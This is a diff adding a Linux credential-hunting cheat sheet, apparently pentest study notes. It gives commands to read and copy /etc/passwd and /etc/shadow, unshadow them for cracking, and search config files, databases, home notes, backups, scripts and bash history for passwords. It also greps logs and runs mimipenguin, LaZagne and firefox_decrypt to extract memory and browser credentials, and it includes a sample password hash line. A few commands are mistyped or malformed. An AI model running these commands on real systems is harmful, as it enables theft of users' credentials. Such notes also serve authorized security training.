@@ -1,1 +1,71 @@
+# PASSWD File
+find /etc/ -name passwd -writable 2>/dev/null
+find /etc/ -name passwd -readable 2>/dev/null
+find /etc/ -name passwd -perm xx6 ( xx5, xx7 ) 2>/dev/null
+cat /etc/passwd
+
+# SHADOW File
+find /etc/ -name shadow -wirtable 2>/dev/null
+find /etc/ -name shadow -readable 2>/dev/null
+cat /etc/shadow
+
+ls -l /etc/shadow
+getfacl /etc/shadow
+
+DUMP: sudo cp /etc/passwd /tmp/passwd.bak 
+DUMP: sudo cp /etc/shadow /tmp/shadow.bak 
+
+UNSHADOW: unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
+
+martin:$6$0XiU8Oe/pGpxWvdq$n6TgiYUVAXBUOO11C155Ea8nNpSVtFFVQveY6yExlOdPu99hY4V9Chi1KEy/lAluVFuVcvi8QCO1mCG6ra70A1:1000:1000:Martin Mendes:/home/martin:/usr/bin/zsh
+       HASH Type  | SALT | |                                      Hash                                          |
+
+# OPASSWD File
+find /etc/ -name opasswd -writable 2>/dev/null
+cat /etc/security/opasswd
+
+# Credential Hunting
+
+( Find Configuration Files ) for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done 
+( Find Main Credentials ) for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
+( Find Database files ) for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
+( Find Notes ) find /home/* -type f -name "*.txt" -o ! -name "*.*"
+( Find Backup ) find /home/* -name "*backup*" 2>/dev/null
+( Find Scripts ) for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+
+# History
+
+tail -n5 /home/*/.bash*
+
+# Enumerating log files
+
+/var/log/messages	Generic system activity logs.
+/var/log/syslog	Generic system activity logs.
+/var/log/auth.log	(Debian) All authentication related logs.
+/var/log/secure	(RedHat/CentOS) All authentication related logs.
+/var/log/boot.log	Booting information.
+/var/log/dmesg	Hardware and drivers related information and logs.
+/var/log/kern.log	Kernel related warnings, errors and logs.
+/var/log/faillog	Failed login attempts.
+/var/log/cron	Information related to cron jobs.
+/var/log/mail.log	All mail server related logs.
+/var/log/httpd	All Apache related logs.
+/var/log/mysqld.log	All MySQL server related logs.
+
+for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
+
+# Memory and cache
+https://github.com/huntergregal/mimipenguin
+
+sudo python3 mimipenguin.py
+
+# LaZaGne
+sudo python2.7 laZagne.py all
+
+# Browser Credential
+ls -l .mozilla/firefox/ | grep default 
+cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
+
+https://github.com/unode/firefox_decrypt
+python3.9 firefox_decrypt.py
 
